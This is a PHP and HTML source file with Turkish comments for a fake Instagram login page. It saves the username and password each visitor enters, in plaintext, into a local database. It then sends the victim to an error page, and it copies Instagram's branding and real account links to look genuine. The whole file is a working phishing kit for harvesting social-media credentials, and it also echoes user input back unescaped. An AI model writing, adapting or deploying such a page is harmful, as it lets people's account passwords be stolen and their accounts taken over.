<?php
// Hata raporlama
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Hata mesajı
$errorMessage = '';

// db.php dosyasındaki veritabanı bağlantısı
$host = 'localhost'; // Sunucu
$dbname = 'insta'; // Veritabanı adı
$username = 'root'; // Veritabanı kullanıcı adı
$password = ''; // Veritabanı şifresi

try {
    // PDO bağlantısı
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // Hata ayıklama modu
} catch (PDOException $e) {
    // Hata oluşursa mesaj verir
    die("Veritabanına bağlanılamadı: " . $e->getMessage());
}

// Form verilerini al
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'];
    $sifre = $_POST['sifre'];

    // Boş alanları kontrol et
    if (empty($name) || empty($sifre)) {
        $errorMessage = 'Lütfen tüm alanları doldurun.';
    } else {
        // Veritabanına kayıt işlemi
        $sql = "INSERT INTO kullanicilar (name, sifre) VALUES (:name, :sifre)";
        $stmt = $pdo->prepare($sql);
        
        // Veritabanına verileri bağlama
        $stmt->bindParam(':name', $name);
        $stmt->bindParam(':sifre', $sifre);
        
        // Veritabanına veri ekleme ve yönlendirme
        if ($stmt->execute()) {
            // Başarı durumunda yönlendirme
            header('Location: hata.php'); // Yönlendirme yapılacak sayfa
            exit(); // Kodun çalışmasını durdur
        } else {
            $errorMessage = 'Bir hata oluştu, tekrar deneyin.';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kayıt Sayfası</title>
    <link rel="stylesheet" href="insta.css">
</head>
<body>  
    <!-- Logo -->
    <img src="insta.png" alt="Logo" class="logo">

    <!-- Facebook Login Button -->
    <a style="text-decoration: none;" href="https://www.facebook.com/login.php/"><button class="facebook-btn">
        <img src="face.png" alt="Facebook Icon" class="icon">
        Facebook ile Devam Et
    </button></a>

    <!-- Divider -->
    <div class="divider">YA DA</div>

    <!-- Giriş Formu -->
    <form action="index.php" method="POST" class="login-form">
        <input type="text" id="name" name="name" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="input-field" value="<?php echo isset($name) ? $name : ''; ?>">
        <input type="password" id="sifre" name="sifre" placeholder="Şifre" class="input-field">
        
        <a href="https://www.instagram.com/accounts/password/reset" class="forgot-password">Şifreni mi unuttun?</a>

        <button class="login-btn" type="submit">Giriş Yap</button>
    </form>

    <!-- Hata Mesajı Kutusu -->
    <?php if (!empty($errorMessage)) : ?>
        <div class="error-message" id="error-message">
            <p class="error-text"><?php echo $errorMessage; ?></p>
            <button id="retry-btn" class="retry-btn" onclick="window.location.href='index.php';">Tekrar Dene</button>
        </div>
    <?php endif; ?>

    <p style="color: rgb(129, 128, 128);" class="signup-link">Hesabın yok mu? <a style="text-decoration: none;" href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a></p>

    <!-- Footer Resmi -->
    <div class="footer">
        <div style="color: rgba(128, 128, 128, 0.685);" class="from-text">from</div>
        <img src="alt.png" alt="Footer Image">
    </div>
</body>
</html>
